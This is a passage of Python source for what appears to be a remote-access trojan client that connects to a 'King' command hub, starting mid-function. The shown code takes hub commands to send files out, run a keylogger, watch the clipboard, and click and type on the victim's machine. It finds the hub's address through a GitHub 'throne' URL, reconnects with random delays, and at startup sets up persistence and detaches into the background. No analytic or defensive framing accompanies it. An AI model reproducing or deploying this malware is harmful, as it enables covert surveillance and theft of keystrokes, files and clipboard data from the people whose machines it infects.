                        file_path = command[13:].strip('"')
                        payload = extract_file_bytes(file_path)
                        if payload is None:
                            send_atomic_data(client, 'FILE', f'Error: could not read {file_path}'.encode('utf-8'), os.path.basename(file_path) or 'unknown.txt', is_websocket=True)
                        else:
                            send_atomic_data(client, 'FILE', payload, os.path.basename(file_path), is_websocket=True)
                    elif command.startswith('KEYLOG'):
                        if not PYNPUT_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pynput\n')
                        elif 'START' in command.upper():
                            client.send(f'KEYLOG_RESULT: {start_keylogger()}\n'.encode('utf-8'))
                        elif 'STOP' in command.upper():
                            client.send(f'KEYLOG_RESULT: {stop_keylogger()}\n'.encode('utf-8'))
                        else:
                            client.send(b'KEYLOG_RESULT: Use KEYLOG START or KEYLOG STOP\n')
                    elif command.startswith('CLIPBOARD'):
                        if not PYPERCLIP_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pyperclip\n')
                        elif 'START' in command.upper():
                            client.send(f'CLIPBOARD_RESULT: {start_clipboard_monitor()}\n'.encode('utf-8'))
                        elif 'STOP' in command.upper():
                            client.send(f'CLIPBOARD_RESULT: {stop_clipboard_monitor()}\n'.encode('utf-8'))
                        else:
                            client.send(b'CLIPBOARD_RESULT: Use CLIPBOARD START or CLIPBOARD STOP\n')
                    elif command.startswith('CLICK '):
                        if not PYAUTOGUI_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
                        else:
                            try:
                                parts = command.split()
                                x = int(parts[1])
                                y = int(parts[2])
                                pyautogui.click(x, y)
                            except Exception:
                                pass
                    elif command.startswith('TYPE '):
                        if not PYAUTOGUI_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
                        else:
                            try:
                                text = command[5:].strip('"')
                                pyautogui.typewrite(text)
                            except Exception:
                                pass
                    else:
                        pass
        except websocket.WebSocketConnectionClosedException:
            print('[-] WebSocket connection closed while listening to hub.')
        except websocket.WebSocketException as e:
            print(f'[-] WebSocket error: {e}')
        except requests.RequestException as e:
            print(f'[-] Failed to fetch King URL from GitHub: {e}')
        except Exception as exc:
            print(f'[-] Unexpected error: {exc}')
        finally:
            try:
                if client is not None:
                    client.close()
            except Exception:
                pass

        delay = random.randint(5, 15)
        print(f'[*] Retrying in {delay} seconds...')
        time.sleep(delay)


# Argument parsing uses defaults from constants, but respects environment
# overrides and explicit command line values.
def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description='Node client for connecting to the King command hub')
    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', HUB_ADDRESS), help='IP address or hostname of the King command hub')
    parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', str(HUB_PORT))), help='Port of the King command hub')
    parser.add_argument('--github-throne-url', default=os.getenv('KING_THRONE_URL', DEFAULT_GITHUB_THRONE_URL), help='GitHub raw URL to retrieve King IP from (overrides --hub-ip when present)')
    parser.add_argument('--throne-url', default=os.getenv('KING_THRONE_URL', DEFAULT_GITHUB_THRONE_URL), help='Alias for --github-throne-url')
    parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
    parser.add_argument('--detached', action='store_true', help='Run in background')
    args = parser.parse_args()
    if not args.github_throne_url and args.throne_url:
        args.github_throne_url = args.throne_url
    return args


def get_king_url(github_throne_url=DEFAULT_GITHUB_THRONE_URL):
    """Pull the fresh King URL from GitHub throne."""
    if not github_throne_url:
        return None

    try:
        response = requests.get(github_throne_url, timeout=10, headers={
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        })
        return response.text.strip()
    except Exception as e:
        print(f'[-] Failed to fetch King URL from throne: {e}')
        return None


def main_loop(hub_ip, port, github_throne_url):
    """Keep reconnecting to the King if the session drops."""
    while True:
        try:
            connect_to_hub(hub_ip, port, github_throne_url)
        except Exception as e:
            print(f'[-] Connection lost. Retrying in 30 seconds...')
        time.sleep(30)


if __name__ == '__main__':
    args = parse_args()
    silent_bootstrap()
    if not args.detached:
        run_detached()
    if not args.no_persist:
        target_file = establish_persistence()
        threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
        ensure_service_continuity()
    print('\n============================================================')
    print(' Agent Node Client')
    print('------------------------------------------------------------')
    print(f'Hub IP:    {args.hub_ip}')
    print(f'Hub Port:  {args.hub_port}')
    print(f'Python:    {platform.python_version()}')
    print(f'Platform:  {platform.system()} {platform.release()}')
    print(f'MSS:       {"available" if MSS_AVAILABLE else "missing"}')
    print(f'PIL:       {"available" if PIL_AVAILABLE else "missing"}')
    print('============================================================\n')
    if args.github_throne_url:
        print(f'[*] Using GitHub throne to resolve King domain: {args.github_throne_url}')
    else:
        print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')

    main_loop(args.hub_ip, args.hub_port, args.github_throne_url)
